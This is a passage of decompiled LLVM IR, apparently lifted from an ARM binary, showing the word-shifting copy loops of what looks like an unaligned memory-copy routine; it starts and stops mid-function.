  %v4_1818c = and i32 %v3_1818c, %v0_1818c
  %v5_1818c = icmp slt i32 %v4_1818c, 0
  %v6_1818c = icmp slt i32 %v1_1818c, 0
  %v2_18190 = xor i1 %v6_1818c, %v5_1818c
  br i1 %v2_18190, label %dec_label_pc_18194.loopexit, label %dec_label_pc_1817c

dec_label_pc_18194.loopexit:                      ; preds = %dec_label_pc_1817c
  %v7_1818c = icmp eq i32 %v0_1818c, 4
  store i1 %v5_1818c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1818c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1818c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18194

dec_label_pc_18194:                               ; preds = %dec_label_pc_18194.loopexit, %dec_label_pc_18170
  %v0_180bc59 = phi i32 [ %v1_1818c, %dec_label_pc_18194.loopexit ], [ %v1_18174, %dec_label_pc_18170 ]
  %v0_18194 = load i32, i32* %r1.global-to-local, align 4
  %v1_18194 = add i32 %v0_18194, -3
  store i32 %v1_18194, i32* @r1, align 4
  br label %bb140

dec_label_pc_1819c:                               ; preds = %dec_label_pc_1811c
  br i1 %v2_181a0, label %dec_label_pc_181e8, label %dec_label_pc_181a4

dec_label_pc_181a4:                               ; preds = %dec_label_pc_1819c
  store i32 %v1_1819c, i32* %r2.global-to-local, align 4
  %v3_181a8 = load i32, i32* @r4, align 4
  store i32 %v3_181a8, i32* %stack_var_-16, align 4
  %v6_181a8 = load i32, i32* @r5, align 4
  store i32 %v6_181a8, i32* %stack_var_-12, align 4
  br label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %dec_label_pc_181ac.dec_label_pc_181ac_crit_edge, %dec_label_pc_181a4
  %v0_181d0 = phi i32 [ %v12_181d0, %dec_label_pc_181ac.dec_label_pc_181ac_crit_edge ], [ %v0_1823c76, %dec_label_pc_181a4 ]
  %v0_181b0 = phi i32 [ %v0_181b0.pre, %dec_label_pc_181ac.dec_label_pc_181ac_crit_edge ], [ %v4_18120, %dec_label_pc_181a4 ]
  %v0_181ac = phi i32 [ %v0_181ac.pre, %dec_label_pc_181ac.dec_label_pc_181ac_crit_edge ], [ %v2_18120, %dec_label_pc_181a4 ]
  %v3_181ac = udiv i32 %v0_181ac, 65536
  %v1_181b0 = inttoptr i32 %v0_181b0 to i32*
  %v2_181b0 = load i32, i32* %v1_181b0, align 4
  store i32 %v2_181b0, i32* %r4.global-to-local, align 4
  %v3_181b0 = add i32 %v0_181b0, 4
  %v4_181b0 = inttoptr i32 %v3_181b0 to i32*
  %v5_181b0 = load i32, i32* %v4_181b0, align 4
  store i32 %v5_181b0, i32* %r5.global-to-local, align 4
  %v6_181b0 = add i32 %v0_181b0, 8
  %v7_181b0 = inttoptr i32 %v6_181b0 to i32*
  %v8_181b0 = load i32, i32* %v7_181b0, align 4
  store i32 %v8_181b0, i32* %ip.global-to-local, align 4
  %v9_181b0 = add i32 %v0_181b0, 12
  %v10_181b0 = inttoptr i32 %v9_181b0 to i32*
  %v11_181b0 = load i32, i32* %v10_181b0, align 4
  store i32 %v11_181b0, i32* %lr.global-to-local, align 4
  %v12_181b0 = add i32 %v0_181b0, 16
  store i32 %v12_181b0, i32* %r1.global-to-local, align 4
  %v4_181b4 = mul i32 %v2_181b0, 65536
  %v5_181b4 = or i32 %v4_181b4, %v3_181ac
  store i32 %v5_181b4, i32* @r3, align 4
  %v3_181b8 = udiv i32 %v2_181b0, 65536
  %v4_181bc = mul i32 %v5_181b0, 65536
  %v5_181bc = or i32 %v4_181bc, %v3_181b8
  store i32 %v5_181bc, i32* %r4.global-to-local, align 4
  %v3_181c0 = udiv i32 %v5_181b0, 65536
  %v4_181c4 = mul i32 %v8_181b0, 65536
  %v5_181c4 = or i32 %v4_181c4, %v3_181c0
  store i32 %v5_181c4, i32* %r5.global-to-local, align 4
  %v3_181c8 = udiv i32 %v8_181b0, 65536
  %v4_181cc = mul i32 %v11_181b0, 65536
  %v5_181cc = or i32 %v4_181cc, %v3_181c8
  store i32 %v5_181cc, i32* @ip, align 4
  %v1_181d0 = inttoptr i32 %v0_181d0 to i32*
  store i32 %v5_181b4, i32* %v1_181d0, align 4
  %v3_181d0 = add i32 %v0_181d0, 4
  %v4_181d0 = inttoptr i32 %v3_181d0 to i32*
  %v5_181d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_181d0, i32* %v4_181d0, align 4
  %v6_181d0 = add i32 %v0_181d0, 8
  %v7_181d0 = inttoptr i32 %v6_181d0 to i32*
  %v8_181d0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_181d0, i32* %v7_181d0, align 4
  %v9_181d0 = add i32 %v0_181d0, 12
  %v10_181d0 = inttoptr i32 %v9_181d0 to i32*
  %v11_181d0 = load i32, i32* @ip, align 4
  store i32 %v11_181d0, i32* %v10_181d0, align 4
  %v12_181d0 = add i32 %v0_181d0, 16
  store i32 %v12_181d0, i32* @r0, align 4
  %v0_181d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_181d4 = add i32 %v0_181d4, -16
  store i32 %v1_181d4, i32* %r2.global-to-local, align 4
  %v3_181d4 = sub i32 15, %v0_181d4
  %v4_181d4 = and i32 %v3_181d4, %v0_181d4
  %v5_181d4 = icmp slt i32 %v4_181d4, 0
  %v6_181d4 = icmp slt i32 %v1_181d4, 0
  %v2_181d8 = xor i1 %v6_181d4, %v5_181d4
  br i1 %v2_181d8, label %dec_label_pc_181dc, label %dec_label_pc_181ac.dec_label_pc_181ac_crit_edge

dec_label_pc_181ac.dec_label_pc_181ac_crit_edge:  ; preds = %dec_label_pc_181ac
  %v0_181ac.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_181b0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181ac

dec_label_pc_181dc:                               ; preds = %dec_label_pc_181ac
  %v2_181dc = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_181dc, i32* @r4, align 4
  %v5_181dc = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_181dc, i32* @r5, align 4
  %v1_181e0 = add i32 %v0_181d4, -4
  store i32 %v1_181e0, i32* %r2.global-to-local, align 4
  %v3_181e0 = add i32 %v0_181d4, 2147483632
  %v4_181e0 = and i32 %v1_181e0, %v3_181e0
  %v5_181e0 = icmp slt i32 %v4_181e0, 0
  store i1 %v5_181e0, i1* %cpsr_v.global-to-local, align 1
  %v6_181e0 = icmp slt i32 %v1_181e0, 0
  store i1 %v6_181e0, i1* %cpsr_n.global-to-local, align 1
  %v7_181e0 = icmp eq i32 %v1_181e0, 0
  store i1 %v7_181e0, i1* %cpsr_z.global-to-local, align 1
  %v2_181e4 = xor i1 %v6_181e0, %v5_181e0
  br i1 %v2_181e4, label %dec_label_pc_18200, label %dec_label_pc_181e8

dec_label_pc_181e8:                               ; preds = %dec_label_pc_181dc, %dec_label_pc_1819c, %dec_label_pc_181e8
  %v1_181f4 = phi i32 [ %v4_181f4, %dec_label_pc_181e8 ], [ %v12_181d0, %dec_label_pc_181dc ], [ %v0_1823c76, %dec_label_pc_1819c ]
  %v0_181e8 = load i32, i32* %lr.global-to-local, align 4
  %v3_181e8 = udiv i32 %v0_181e8, 65536
  store i32 %v3_181e8, i32* %ip.global-to-local, align 4
  %v0_181ec = load i32, i32* %r1.global-to-local, align 4
  %v1_181ec = inttoptr i32 %v0_181ec to i32*
  %v2_181ec = load i32, i32* %v1_181ec, align 4
  store i32 %v2_181ec, i32* %lr.global-to-local, align 4
  %v4_181ec = add i32 %v0_181ec, 4
  store i32 %v4_181ec, i32* %r1.global-to-local, align 4
  %v4_181f0 = mul i32 %v2_181ec, 65536
  %v5_181f0 = or i32 %v4_181f0, %v3_181e8
  store i32 %v5_181f0, i32* @ip, align 4
  %v2_181f4 = inttoptr i32 %v1_181f4 to i32*
  store i32 %v5_181f0, i32* %v2_181f4, align 4
  %v3_181f4 = load i32, i32* @r0, align 4
  %v4_181f4 = add i32 %v3_181f4, 4
  store i32 %v4_181f4, i32* @r0, align 4
  %v0_181f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_181f8 = add i32 %v0_181f8, -4
  store i32 %v1_181f8, i32* %r2.global-to-local, align 4
  %v3_181f8 = sub i32 3, %v0_181f8
  %v4_181f8 = and i32 %v3_181f8, %v0_181f8
  %v5_181f8 = icmp slt i32 %v4_181f8, 0
  %v6_181f8 = icmp slt i32 %v1_181f8, 0
  %v2_181fc = xor i1 %v6_181f8, %v5_181f8
  br i1 %v2_181fc, label %dec_label_pc_18200.loopexit, label %dec_label_pc_181e8

dec_label_pc_18200.loopexit:                      ; preds = %dec_label_pc_181e8
  %v7_181f8 = icmp eq i32 %v0_181f8, 4
  store i1 %v5_181f8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_181f8, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_181f8, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_18200

dec_label_pc_18200:                               ; preds = %dec_label_pc_18200.loopexit, %dec_label_pc_181dc
  %v0_180bc60 = phi i32 [ %v1_181f8, %dec_label_pc_18200.loopexit ], [ %v1_181e0, %dec_label_pc_181dc ]
  %v0_18200 = load i32, i32* %r1.global-to-local, align 4
  %v1_18200 = add i32 %v0_18200, -2
  store i32 %v1_18200, i32* @r1, align 4
  br label %bb140

dec_label_pc_18208:                               ; preds = %dec_label_pc_1811c
  br i1 %v2_181a0, label %dec_label_pc_18254, label %dec_label_pc_18210

dec_label_pc_18210:                               ; preds = %dec_label_pc_18208
  store i32 %v1_1819c, i32* %r2.global-to-local, align 4
  %v3_18214 = load i32, i32* @r4, align 4
  store i32 %v3_18214, i32* %stack_var_-16, align 4
  %v6_18214 = load i32, i32* @r5, align 4
  store i32 %v6_18214, i32* %stack_var_-12, align 4
  br label %dec_label_pc_18218

dec_label_pc_18218:                               ; preds = %dec_label_pc_18218.dec_label_pc_18218_crit_edge, %dec_label_pc_18210
  %v0_1823c = phi i32 [ %v12_1823c, %dec_label_pc_18218.dec_label_pc_18218_crit_edge ], [ %v0_1823c76, %dec_label_pc_18210 ]
  %v0_1821c = phi i32 [ %v0_1821c.pre, %dec_label_pc_18218.dec_label_pc_18218_crit_edge ], [ %v4_18120, %dec_label_pc_18210 ]
  %v0_18218 = phi i32 [ %v0_18218.pre, %dec_label_pc_18218.dec_label_pc_18218_crit_edge ], [ %v2_18120, %dec_label_pc_18210 ]
  %v3_18218 = udiv i32 %v0_18218, 16777216
  %v1_1821c = inttoptr i32 %v0_1821c to i32*
  %v2_1821c = load i32, i32* %v1_1821c, align 4
  store i32 %v2_1821c, i32* %r4.global-to-local, align 4
  %v3_1821c = add i32 %v0_1821c, 4
  %v4_1821c = inttoptr i32 %v3_1821c to i32*
  %v5_1821c = load i32, i32* %v4_1821c, align 4
  store i32 %v5_1821c, i32* %r5.global-to-local, align 4
  %v6_1821c = add i32 %v0_1821c, 8
  %v7_1821c = inttoptr i32 %v6_1821c to i32*
  %v8_1821c = load i32, i32* %v7_1821c, align 4
  store i32 %v8_1821c, i32* %ip.global-to-local, align 4
  %v9_1821c = add i32 %v0_1821c, 12
  %v10_1821c = inttoptr i32 %v9_1821c to i32*
  %v11_1821c = load i32, i32* %v10_1821c, align 4
  store i32 %v11_1821c, i32* %lr.global-to-local, align 4
  %v12_1821c = add i32 %v0_1821c, 16
  store i32 %v12_1821c, i32* %r1.global-to-local, align 4
  %v4_18220 = mul i32 %v2_1821c, 256
  %v5_18220 = or i32 %v4_18220, %v3_18218
  store i32 %v5_18220, i32* @r3, align 4
  %v3_18224 = udiv i32 %v2_1821c, 16777216
  %v4_18228 = mul i32 %v5_1821c, 256
  %v5_18228 = or i32 %v4_18228, %v3_18224
  store i32 %v5_18228, i32* %r4.global-to-local, align 4
  %v3_1822c = udiv i32 %v5_1821c, 16777216
  %v4_18230 = mul i32 %v8_1821c, 256
  %v5_18230 = or i32 %v4_18230, %v3_1822c
  store i32 %v5_18230, i32* %r5.global-to-local, align 4
  %v3_18234 = udiv i32 %v8_1821c, 16777216
  %v4_18238 = mul i32 %v11_1821c, 256
  %v5_18238 = or i32 %v4_18238, %v3_18234
  store i32 %v5_18238, i32* @ip, align 4
  %v1_1823c = inttoptr i32 %v0_1823c to i32*
  store i32 %v5_18220, i32* %v1_1823c, align 4
  %v3_1823c = add i32 %v0_1823c, 4
  %v4_1823c = inttoptr i32 %v3_1823c to i32*
  %v5_1823c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_1823c, i32* %v4_1823c, align 4
  %v6_1823c = add i32 %v0_1823c, 8
  %v7_1823c = inttoptr i32 %v6_1823c to i32*
  %v8_1823c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_1823c, i32* %v7_1823c, align 4
  %v9_1823c = add i32 %v0_1823c, 12
  %v10_1823c = inttoptr i32 %v9_1823c to i32*
  %v11_1823c = load i32, i32* @ip, align 4
  store i32 %v11_1823c, i32* %v10_1823c, align 4
  %v12_1823c = add i32 %v0_1823c, 16
  store i32 %v12_1823c, i32* @r0, align 4
  %v0_18240 = load i32, i32* %r2.global-to-local, align 4
  %v1_18240 = add i32 %v0_18240, -16
  store i32 %v1_18240, i32* %r2.global-to-local, align 4
  %v3_18240 = sub i32 15, %v0_18240
  %v4_18240 = and i32 %v3_18240, %v0_18240
  %v5_18240 = icmp slt i32 %v4_18240, 0
  %v6_18240 = icmp slt i32 %v1_18240, 0
  %v2_18244 = xor i1 %v6_18240, %v5_18240
  br i1 %v2_18244, label %dec_label_pc_18248, label %dec_label_pc_18218.dec_label_pc_18218_crit_edge

dec_label_pc_18218.dec_label_pc_18218_crit_edge:  ; preds = %dec_label_pc_18218
  %v0_18218.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1821c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18218

dec_label_pc_18248:                               ; preds = %dec_label_pc_18218
  %v2_18248 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18248, i32* @r4, align 4
  %v5_18248 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_18248, i32* @r5, align 4
  %v1_1824c = add i32 %v0_18240, -4
  store i32 %v1_1824c, i32* %r2.global-to-local, align 4
  %v3_1824c = add i32 %v0_18240, 2147483632
  %v4_1824c = and i32 %v1_1824c, %v3_1824c
  %v5_1824c = icmp slt i32 %v4_1824c, 0
  store i1 %v5_1824c, i1* %cpsr_v.global-to-local, align 1
  %v6_1824c = icmp slt i32 %v1_1824c, 0
  store i1 %v6_1824c, i1* %cpsr_n.global-to-local, align 1
  %v7_1824c = icmp eq i32 %v1_1824c, 0
  store i1 %v7_1824c, i1* %cpsr_z.global-to-local, align 1
  %v2_18250 = xor i1 %v6_1824c, %v5_1824c
  br i1 %v2_18250, label %dec_label_pc_1826c, label %dec_label_pc_18254

dec_label_pc_18254:                               ; preds = %dec_label_pc_18248, %dec_label_pc_18208, %dec_label_pc_18254
  %v1_18260 = phi i32 [ %v4_18260, %dec_label_pc_18254 ], [ %v12_1823c, %dec_label_pc_18248 ], [ %v0_1823c76, %dec_label_pc_18208 ]
  %v0_18254 = load i32, i32* %lr.global-to-local, align 4
  %v3_18254 = udiv i32 %v0_18254, 16777216
  store i32 %v3_18254, i32* %ip.global-to-local, align 4
  %v0_18258 = load i32, i32* %r1.global-to-local, align 4
  %v1_18258 = inttoptr i32 %v0_18258 to i32*
  %v2_18258 = load i32, i32* %v1_18258, align 4
  store i32 %v2_18258, i32* %lr.global-to-local, align 4
  %v4_18258 = add i32 %v0_18258, 4
  store i32 %v4_18258, i32* %r1.global-to-local, align 4
  %v4_1825c = mul i32 %v2_18258, 256
  %v5_1825c = or i32 %v4_1825c, %v3_18254
  store i32 %v5_1825c, i32* @ip, align 4
  %v2_18260 = inttoptr i32 %v1_18260 to i32*
  store i32 %v5_1825c, i32* %v2_18260, align 4
  %v3_18260 = load i32, i32* @r0, align 4
  %v4_18260 = add i32 %v3_18260, 4
  store i32 %v4_18260, i32* @r0, align 4
  %v0_18264 = load i32, i32* %r2.global-to-local, align 4
  %v1_18264 = add i32 %v0_18264, -4
  store i32 %v1_18264, i32* %r2.global-to-local, align 4
  %v3_18264 = sub i32 3, %v0_18264
  %v4_18264 = and i32 %v3_18264, %v0_18264
  %v5_18264 = icmp slt i32 %v4_18264, 0
  %v6_18264 = icmp slt i32 %v1_18264, 0
  %v2_18268 = xor i1 %v6_18264, %v5_18264
  br i1 %v2_18268, label %dec_label_pc_1826c.loopexit, label %dec_label_pc_18254

dec_label_pc_1826c.loopexit:                      ; preds = %dec_label_pc_18254
  %v7_18264 = icmp eq i32 %v0_18264, 4
  store i1 %v5_18264, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_18264, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_18264, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_1826c

dec_label_pc_1826c:                               ; preds = %dec_label_pc_1826c.loopexit, %dec_label_pc_18248
  %v0_180bc61 = phi i32 [ %v1_18264, %dec_label_pc_1826c.loopexit ], [ %v1_1824c, %dec_label_pc_18248 ]
  %v0_1826c = load i32, i32* %r1.global-to-local, align 4
  %v1_1826c = add i32 %v0_1826c, -1
  store i32 %v1_1826c, i32* @r1, align 4
  br label %bb140

dec_label_pc_18274:                               ; preds = %entry
  %v1_18274 = load i32, i32* @r2, align 4
  %v2_18274 = add i32 %v1_18274, %v0_18020
  store i32 %v2_18274, i32* %r1.global-to-local, align 4
  %v2_18278 = add i32 %v1_18274, %v1_18020
  store i32 %v2_18278, i32* %r0.global-to-local, align 4
  %v2_1827c = add i32 %v1_18274, -4
  store i32 %v2_1827c, i32* %r2.global-to-local, align 4
  %v4_1827c = sub i32 3, %v1_18274
  %v5_1827c = and i32 %v4_1827c, %v1_18274
  %v6_1827c = icmp slt i32 %v5_1827c, 0
  store i1 %v6_1827c, i1* %cpsr_v.global-to-local, align 1
  %v7_1827c = icmp slt i32 %v2_1827c, 0
  store i1 %v7_1827c, i1* %cpsr_n.global-to-local, align 1
  %v8_1827c = icmp eq i32 %v1_18274, 4
  store i1 %v8_1827c, i1* %cpsr_z.global-to-local, align 1
  %v5_18280 = icmp slt i32 %v1_18274, 4
  br i1 %v5_18280, label %bb150, label %dec_label_pc_18284

dec_label_pc_18284:                               ; preds = %dec_label_pc_18274
  %v1_18284 = urem i32 %v2_18278, 4
  store i32 %v1_18284, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_18284 = icmp eq i32 %v1_18284, 0
  store i1 %v2_18284, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18284, label %dec_label_pc_1828c, label %dec_label_pc_1832c

dec_label_pc_1828c:                               ; preds = %dec_label_pc_18284
  %v1_1828c = urem i32 %v2_18274, 4
  store i32 %v1_1828c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1828c = icmp eq i32 %v1_1828c, 0
  store i1 %v2_1828c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1828c, label %dec_label_pc_18294, label %dec_label_pc_18358

dec_label_pc_18294:                               ; preds = %dec_label_pc_1828c, %dec_label_pc_18350
  %v0_182ac37 = phi i32 [ %v2_18278, %dec_label_pc_1828c ], [ %v0_183a020, %dec_label_pc_18350 ]
  %v0_182a836 = phi i32 [ %v2_18274, %dec_label_pc_1828c ], [ %v0_18350, %dec_label_pc_18350 ]
  %v0_18294 = phi i32 [ %v2_1827c, %dec_label_pc_1828c ], [ %v2_18348, %dec_label_pc_18350 ]
  %v2_18294 = add i32 %v0_18294, -8
  store i32 %v2_18294, i32* %r2.global-to-local, align 4
  %v4_18294 = sub i32 7, %v0_18294
  %v5_18294 = and i32 %v4_18294, %v0_18294
  %v6_18294 = icmp slt i32 %v5_18294, 0
  store i1 %v6_18294, i1* %cpsr_v.global-to-local, align 1
  %v7_18294 = icmp slt i32 %v2_18294, 0
  store i1 %v7_18294, i1* %cpsr_n.global-to-local, align 1
  %v8_18294 = icmp eq i32 %v0_18294, 8
  store i1 %v8_18294, i1* %cpsr_z.global-to-local, align 1
  %v5_18298 = icmp slt i32 %v0_18294, 8
  br i1 %v5_18298, label %dec_label_pc_182e4, label %dec_label_pc_1829c

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18294
  %v3_1829c = load i32, i32* @r4, align 4
  %v5_1829c = inttoptr i32 %v3_1829c to i8*
  store i8* %v5_1829c, i8** %stack_var_-8, align 4
  %v8_1829c = load i32, i32* @lr, align 4
  %v2_182a0 = add i32 %v0_18294, -28
  store i32 %v2_182a0, i32* %r2.global-to-local, align 4
  %v4_182a0 = sub i32 27, %v0_18294
  %v5_182a0 = and i32 %v4_182a0, %v2_18294
  %v6_182a0 = icmp slt i32 %v5_182a0, 0
  store i1 %v6_182a0, i1* %cpsr_v.global-to-local, align 1
  %v7_182a0 = icmp slt i32 %v2_182a0, 0
  store i1 %v7_182a0, i1* %cpsr_n.global-to-local, align 1
  %v8_182a0 = icmp eq i32 %v2_18294, 20
  store i1 %v8_182a0, i1* %cpsr_z.global-to-local, align 1
  %v5_182a4 = icmp slt i32 %v2_18294, 20
  br i1 %v5_182a4, label %dec_label_pc_182c0, label %dec_label_pc_182a8

dec_label_pc_182a8:                               ; preds = %dec_label_pc_1829c, %dec_label_pc_182a8.dec_label_pc_182a8_crit_edge
  %v0_182ac = phi i32 [ %v1_182b4, %dec_label_pc_182a8.dec_label_pc_182a8_crit_edge ], [ %v0_182ac37, %dec_label_pc_1829c ]
  %v0_182a8 = phi i32 [ %v0_182a8.pre, %dec_label_pc_182a8.dec_label_pc_182a8_crit_edge ], [ %v0_182a836, %dec_label_pc_1829c ]
  %v1_182a8 = add i32 %v0_182a8, -4
  %v2_182a8 = inttoptr i32 %v1_182a8 to i32*
  %v3_182a8 = load i32, i32* %v2_182a8, align 4
  %v4_182a8 = add i32 %v0_182a8, -8
  %v5_182a8 = inttoptr i32 %v4_182a8 to i32*
  %v6_182a8 = load i32, i32* %v5_182a8, align 4
  store i32 %v6_182a8, i32* %r4.global-to-local, align 4
  %v7_182a8 = add i32 %v0_182a8, -12
  %v8_182a8 = inttoptr i32 %v7_182a8 to i32*
  %v9_182a8 = load i32, i32* %v8_182a8, align 4
  store i32 %v9_182a8, i32* %ip.global-to-local, align 4
  %v10_182a8 = add i32 %v0_182a8, -16
  %v11_182a8 = inttoptr i32 %v10_182a8 to i32*
  %v12_182a8 = load i32, i32* %v11_182a8, align 4
  store i32 %v12_182a8, i32* %lr.global-to-local, align 4
  store i32 %v10_182a8, i32* %r1.global-to-local, align 4
  %v1_182ac = add i32 %v0_182ac, -16
  %v2_182ac = inttoptr i32 %v1_182ac to i32*
  store i32 %v3_182a8, i32* %v2_182ac, align 4
  %v4_182ac = add i32 %v0_182ac, -12
  %v5_182ac = inttoptr i32 %v4_182ac to i32*
  %v6_182ac = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182ac, i32* %v5_182ac, align 4
  %v7_182ac = add i32 %v0_182ac, -8
  %v8_182ac = inttoptr i32 %v7_182ac to i32*
  %v9_182ac = load i32, i32* %ip.global-to-local, align 4
  store i32 %v9_182ac, i32* %v8_182ac, align 4
  %v10_182ac = add i32 %v0_182ac, -4
  %v11_182ac = inttoptr i32 %v10_182ac to i32*
  %v12_182ac = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182ac, i32* %v11_182ac, align 4
  store i32 %v1_182ac, i32* %r0.global-to-local, align 4
  %v0_182b0 = load i32, i32* %r1.global-to-local, align 4
  %v1_182b0 = add i32 %v0_182b0, -4
  %v2_182b0 = inttoptr i32 %v1_182b0 to i32*
  %v3_182b0 = load i32, i32* %v2_182b0, align 4
  store i32 %v3_182b0, i32* @r3, align 4
  %v4_182b0 = add i32 %v0_182b0, -8
  %v5_182b0 = inttoptr i32 %v4_182b0 to i32*
  %v6_182b0 = load i32, i32* %v5_182b0, align 4
  store i32 %v6_182b0, i32* %r4.global-to-local, align 4
  %v7_182b0 = add i32 %v0_182b0, -12
  %v8_182b0 = inttoptr i32 %v7_182b0 to i32*
  %v9_182b0 = load i32, i32* %v8_182b0, align 4
  store i32 %v9_182b0, i32* @ip, align 4
  %v10_182b0 = add i32 %v0_182b0, -16
  %v11_182b0 = inttoptr i32 %v10_182b0 to i32*
  %v12_182b0 = load i32, i32* %v11_182b0, align 4
  store i32 %v12_182b0, i32* %lr.global-to-local, align 4
  store i32 %v10_182b0, i32* %r1.global-to-local, align 4
  %v1_182b4 = add i32 %v0_182ac, -32
  %v2_182b4 = inttoptr i32 %v1_182b4 to i32*
  store i32 %v3_182b0, i32* %v2_182b4, align 4
  %v4_182b4 = add i32 %v0_182ac, -28
  %v5_182b4 = inttoptr i32 %v4_182b4 to i32*
  %v6_182b4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v6_182b4, i32* %v5_182b4, align 4
  %v7_182b4 = add i32 %v0_182ac, -24
  %v8_182b4 = inttoptr i32 %v7_182b4 to i32*
  %v9_182b4 = load i32, i32* @ip, align 4
  store i32 %v9_182b4, i32* %v8_182b4, align 4
  %v10_182b4 = add i32 %v0_182ac, -20
  %v11_182b4 = inttoptr i32 %v10_182b4 to i32*
  %v12_182b4 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_182b4, i32* %v11_182b4, align 4
  store i32 %v1_182b4, i32* %r0.global-to-local, align 4
  %v0_182b8 = load i32, i32* %r2.global-to-local, align 4
  %v2_182b8 = add i32 %v0_182b8, -32
  store i32 %v2_182b8, i32* %r2.global-to-local, align 4
  %v6_182bc = icmp slt i32 %v0_182b8, 32
  br i1 %v6_182bc, label %dec_label_pc_182c0.loopexit, label %dec_label_pc_182a8.dec_label_pc_182a8_crit_edge

dec_label_pc_182a8.dec_label_pc_182a8_crit_edge:  ; preds = %dec_label_pc_182a8
  %v0_182a8.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_182a8

dec_label_pc_182c0.loopexit:                      ; preds = %dec_label_pc_182a8
  %v4_182b8 = sub i32 31, %v0_182b8
  %v5_182b8 = and i32 %v4_182b8, %v0_182b8
  %v6_182b8 = icmp slt i32 %v5_182b8, 0
  %v7_182b8 = icmp slt i32 %v2_182b8, 0
  store i1 %v6_182b8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_182b8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_182c0

dec_label_pc_182c0:                               ; preds = %dec_label_pc_182c0.loopexit, %dec_label_pc_1829c
  %v6_182c8 = phi i32 [ %v1_182b4, %dec_label_pc_182c0.loopexit ], [ %v0_182ac37, %dec_label_pc_1829c ]
  %v0_182d0.pr = phi i32 [ %v2_182b8, %dec_label_pc_182c0.loopexit ], [ %v2_182a0, %dec_label_pc_1829c ]
  %v4_182c0 = add i32 %v0_182d0.pr, 16
  %v6_182c0 = sub i32 0, %v0_182d0.pr
  %v7_182c0 = and i32 %v4_182c0, %v6_182c0
  %v8_182c0 = icmp slt i32 %v7_182c0, 0
  store i1 %v8_182c0, i1* %cpsr_v.global-to-local, align 1
  %v9_182c0 = icmp slt i32 %v4_182c0, 0
  store i1 %v9_182c0, i1* %cpsr_n.global-to-local, align 1
  %v10_182c0 = icmp eq i32 %v4_182c0, 0
  store i1 %v10_182c0, i1* %cpsr_z.global-to-local, align 1
  %v5_182c4 = icmp slt i32 %v0_182d0.pr, -16
  br i1 %v5_182c4, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_182c0
  %v6_182c4 = load i32, i32* %r1.global-to-local, align 4
  %v7_182c4 = add i32 %v6_182c4, -4
  %v8_182c4 = inttoptr i32 %v7_182c4 to i32*
  %v9_182c4 = load i32, i32* %v8_182c4, align 4
  store i32 %v9_182c4, i32* @r3, align 4
  %v10_182c4 = add i32 %v6_182c4, -8
  %v11_182c4 = inttoptr i32 %v10_182c4 to i32*
  %v12_182c4 = load i32, i32* %v11_182c4, align 4
  store i32 %v12_182c4, i32* %r4.global-to-local, align 4
  %v13_182c4 = add i32 %v6_182c4, -12
  %v14_182c4 = inttoptr i32 %v13_182c4 to i32*
  %v15_182c4 = load i32, i32* %v14_182c4, align 4
  store i32 %v15_182c4, i32* @ip, align 4
  %v16_182c4 = add i32 %v6_182c4, -16
  %v17_182c4 = inttoptr i32 %v16_182c4 to i32*
  %v18_182c4 = load i32, i32* %v17_182c4, align 4
  store i32 %v18_182c4, i32* %lr.global-to-local, align 4
  store i32 %v16_182c4, i32* %r1.global-to-local, align 4
  %v7_182c8 = add i32 %v6_182c8, -16
  %v8_182c8 = inttoptr i32 %v7_182c8 to i32*
  store i32 %v9_182c4, i32* %v8_182c8, align 4
  %v10_182c8 = add i32 %v6_182c8, -12
  %v11_182c8 = inttoptr i32 %v10_182c8 to i32*
  %v12_182c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_182c8, i32* %v11_182c8, align 4
  %v13_182c8 = add i32 %v6_182c8, -8
  %v14_182c8 = inttoptr i32 %v13_182c8 to i32*
  %v15_182c8 = load i32, i32* @ip, align 4
  store i32 %v15_182c8, i32* %v14_182c8, align 4
  %v16_182c8 = add i32 %v6_182c8, -4
  %v17_182c8 = inttoptr i32 %v16_182c8 to i32*
  %v18_182c8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_182c8, i32* %v17_182c8, align 4
  store i32 %v7_182c8, i32* %r0.global-to-local, align 4
  %v6_182cc = load i32, i32* %r2.global-to-local, align 4
  %v7_182cc = add i32 %v6_182cc, -16
  store i32 %v7_182cc, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_182c0, %bb147
